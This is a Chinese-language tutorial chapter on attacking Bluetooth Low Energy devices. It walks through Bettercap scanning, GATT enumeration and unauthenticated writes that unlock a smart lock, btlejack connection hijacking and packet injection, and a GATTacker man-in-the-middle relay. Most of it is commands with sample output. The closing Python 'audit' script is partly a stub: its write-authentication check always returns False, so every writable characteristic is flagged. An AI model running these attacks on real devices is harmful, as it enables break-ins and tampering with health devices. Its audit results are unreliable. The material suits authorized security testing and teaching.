# 实战案例：使用 Bettercap 进行 BLE 扫描与攻击

### 7.1 环境准备

```bash
#!/bin/bash
# BLE 渗透测试环境准备

# 1. 安装 Bettercap
apt update
apt install -y bettercap bluez bluez-tools hcitool

# 2. 确认蓝牙适配器
hciconfig
# 应看到 hci0 设备

# 3. 启用蓝牙适配器
hciconfig hci0 up

# 4. 安装辅助工具
pip3 install btlejack gattacker
apt install -y ubertooth wireshark

# 5. 启动 Bettercap
sudo bettercap -interface hci0
```

### 7.2 BLE 扫描与枚举

```bash
#!/bin/bash
# Bettercap BLE 扫描实战

# === 步骤1: 启动 BLE 扫描 ===
# 在 Bettercap 交互界面中执行:

# 开始 BLE 侦察
> ble.recon on

# 查看发现的设备
> ble.show

# 输出示例:
# ┌────────────────────┬──────────────────────┬─────────────┬─────────────┐
# │ MAC Address        │ Name                 │ Vendor      │ RSSI        │
# ├────────────────────┼──────────────────────┼─────────────┼─────────────┤
# │ aa:bb:cc:dd:ee:ff  │ Smart_Lock           │ NXP         │ -45 dBm     │
# │ 11:22:33:44:55:66  │ HR_Monitor           │ Polar       │ -62 dBm     │
# │ 77:88:99:aa:bb:cc  │ Fitness_Band         │ Espressif   │ -71 dBm     │
# └────────────────────┴──────────────────────┴─────────────┴─────────────┘

# === 步骤2: 枚举 GATT 服务 ===
# 选择目标设备，枚举其 GATT 服务和特征值

> ble.enum aa:bb:cc:dd:ee:ff

# 输出示例:
# [*] Enumerating services and characteristics...
#
# [+] Generic Access (0x1800)
#     ├── Device Name (0x2A00) [READ]
#     │     Value: Smart_Lock
#     ├── Appearance (0x2A01) [READ]
#     │     Value: 0x0340
#     ├── Peripheral Privacy (0x2A02) [READ]
#     │     Value: 0x00 (disabled)
#     └── Connection Parameters (0x2A04) [READ]
#
# [+] Unknown Service (0000a000-0000-1000-8000-00805f9b34fb)
#     ├── Lock State (0000a001-...) [READ, NOTIFY]
#     │     Value: 0x00 (UNLOCKED)
#     ├── Lock Control (0000a002-...) [WRITE]
#     │     Permissions: WRITE, no auth
#     └── Admin Code (0000a003-...) [READ, WRITE]
#           Value: 0x313233343536 (123456)
#
# [!] Found writable characteristic without authentication!
# [!] Found hardcoded admin code: 123456

# === 步骤3: 读取所有可读特征 ===
> ble.read aa:bb:cc:dd:ee:ff 0x2a00
# Device Name: Smart_Lock

> ble.read aa:bb:cc:dd:ee:ff 0x2a01
# Appearance: 0x0340

# === 步骤4: 写入特征值 ===
# 尝试控制智能锁（假设 handle 0x002a 是锁控制）
> ble.write aa:bb:cc:dd:ee:ff 0x002a 01
# [+] Written 1 byte to 0x002a

# === 步骤5: 订阅通知 ===
> ble.notify aa:bb:cc:dd:ee:ff 0x002b
# [*] Notifications enabled for handle 0x002b
# [NOTIFY] 0x002b: 0x01 (LOCKED)
```

### 7.3 BLE MITM 攻击实战

```bash
#!/bin/bash
# BLE 中间人攻击实战

# === 方法1: 使用 btlejack ===

# 1. 扫描活跃的 BLE 连接
btlejack -s

# 输出:
# [*] Scanning for active connections...
# [+] Found connection: AccessAddr=0x12345678, CRCInit=0x555555, Hop=5, Interval=12

# 2. 劫持目标连接
btlejack -j 0x12345678 -m 0x555555

# 3. 注入数据包
btlejack -i 0x12345678 --inject 02070100

# === 方法2: 使用 GATTacker ===

# 1. 克隆目标设备的服务
# 扫描并克隆
cd gattacker
node scan.js
# 等待发现目标设备
# 记录设备地址和 GATT 结构

# 2. 提取 GATT 结构
node enumerate.js -a aa:bb:cc:dd:ee:ff

# 3. 启动伪造设备
sudo hciconfig hci0 up
node advertise.js -a aa:bb:cc:dd:ee:ff

# 4. 等待客户端连接
# 客户端连接到伪造设备
# GATTacker 自动中继到真实设备

# 5. 修改中继数据
# 配置 GATTacker 规则文件
# 篡改特定特征值

# === 方法3: 使用 Bettercap ===
# 启动 Bettercap
sudo bettercap -interface hci0

# 扫描
> ble.recon on
> ble.show

# 枚举目标
> ble.enum aa:bb:cc:dd:ee:ff

# 如果目标使用 Just Works 配对
# 可以直接连接并操作
> ble.connect aa:bb:cc:dd:ee:ff
> ble.write aa:bb:cc:dd:ee:ff 0x002a 01

# 记录所有流量用于分析
> ble.sniff on
```

### 7.4 BLE 安全审计报告

```python
#!/usr/bin/env python3
"""
BLE 安全审计报告生成器
自动化审计 BLE 设备安全配置
"""

from bluepy.btle import Peripheral, Scanner, UUID
import json
import datetime

class BLESecurityAuditor:
    """BLE 设备安全审计工具"""
    
    def __init__(self, target_addr):
        self.target_addr = target_addr
        self.device = None
        self.findings = []
        self.services = []
    
    def scan_device(self):
        """扫描目标设备"""
        scanner = Scanner()
        devices = scanner.scan(10.0)
        
        for dev in devices:
            if dev.addr == self.target_addr:
                return {
                    'address': dev.addr,
                    'rssi': dev.rssi,
                    'name': dev.getValueText(9),  # Complete Local Name
                    'tx_power': dev.getValueText(10),
                }
        return None
    
    def connect_and_enum(self):
        """连接并枚举设备"""
        try:
            self.device = Peripheral(self.target_addr)
            services = self.device.getServices()
            
            for svc in services:
                svc_info = {
                    'uuid': str(svc.uuid),
                    'characteristics': []
                }
                
                for char in svc.getCharacteristics():
                    char_info = {
                        'uuid': str(char.uuid),
                        'handle': char.getHandle(),
                        'properties': self._get_props(char),
                        'value': None,
                        'writable_no_auth': False,
                    }
                    
                    # 尝试读取
                    if 'READ' in char_info['properties']:
                        try:
                            val = char.read()
                            char_info['value'] = val.hex()
                        except Exception as e:
                            char_info['read_error'] = str(e)
                    
                    # 检查是否需要认证
                    if 'WRITE' in char_info['properties']:
                        try:
                            descs = self.device.getDescriptors(
                                char.getHandle(),
                                char.getHandle() + 1
                            )
                            for d in descs:
                                if d.uuid == 0x2902:
                                    char_info['ccc_handle'] = d.handle
                        except:
                            pass
                    
                    svc_info['characteristics'].append(char_info)
                
                self.services.append(svc_info)
            
            return True
        except Exception as e:
            self.findings.append({
                'severity': 'ERROR',
                'finding': f'连接失败: {str(e)}'
            })
            return False
    
    def _get_props(self, char):
        """获取特征属性"""
        props = []
        val = char.properties
        if val & 0x01: props.append('BROADCAST')
        if val & 0x02: props.append('READ')
        if val & 0x04: props.append('WRITE_NO_RESP')
        if val & 0x08: props.append('WRITE')
        if val & 0x10: props.append('NOTIFY')
        if val & 0x20: props.append('INDICATE')
        if val & 0x40: props.append('SIGNED_WRITE')
        if val & 0x80: props.append('EXTENDED')
        return props
    
    def check_security(self):
        """检查安全问题"""
        for svc in self.services:
            for char in svc['characteristics']:
                # 检查无认证写入
                if 'WRITE' in char['properties']:
                    # 尝试无认证写入
                    if not self._check_write_auth(char):
                        self.findings.append({
                            'severity': 'HIGH',
                            'finding': f"可无认证写入: {char['uuid']} "
                                      f"(handle 0x{char['handle']:04x})"
                        })
                
                # 检查敏感数据暴露
                if char['value'] and self._is_sensitive(char):
                    self.findings.append({
                        'severity': 'MEDIUM',
                        'finding': f"敏感数据可读: {char['uuid']} "
                                  f"value={char['value']}"
                    })
    
    def _check_write_auth(self, char):
        """检查写入是否需要认证"""
        # 在实际实现中需要检查描述符
        return False  # 简化版
    
    def _is_sensitive(self, char):
        """判断是否为敏感特征"""
        sensitive_uuids = [
            '2a00',  # Device Name
            '2a01',  # Appearance
            '2a04',  # Connection Parameters
            '2a25',  # Serial Number
            '2a27',  # Firmware Revision
        ]
        uuid_short = char['uuid'].split('-')[0][-4:]
        return uuid_short.lower() in sensitive_uuids
    
    def generate_report(self):
        """生成审计报告"""
        report = {
            'target': self.target_addr,
            'timestamp': datetime.datetime.now().isoformat(),
            'services_enumerated': len(self.services),
            'findings': self.findings,
            'services': self.services,
        }
        return json.dumps(report, indent=2, ensure_ascii=False)


# 使用示例
if __name__ == '__main__':
    auditor = BLESecurityAuditor('aa:bb:cc:dd:ee:ff')
    
    print("[*] 扫描设备...")
    dev_info = auditor.scan_device()
    if dev_info:
        print(f"[+] 发现设备: {dev_info['name']}")
    
    print("[*] 枚举服务和特征...")
    if auditor.connect_and_enum():
        print("[*] 检查安全问题...")
        auditor.check_security()
        
        print("\n=== 审计报告 ===")
        print(auditor.generate_report())
```

---

---

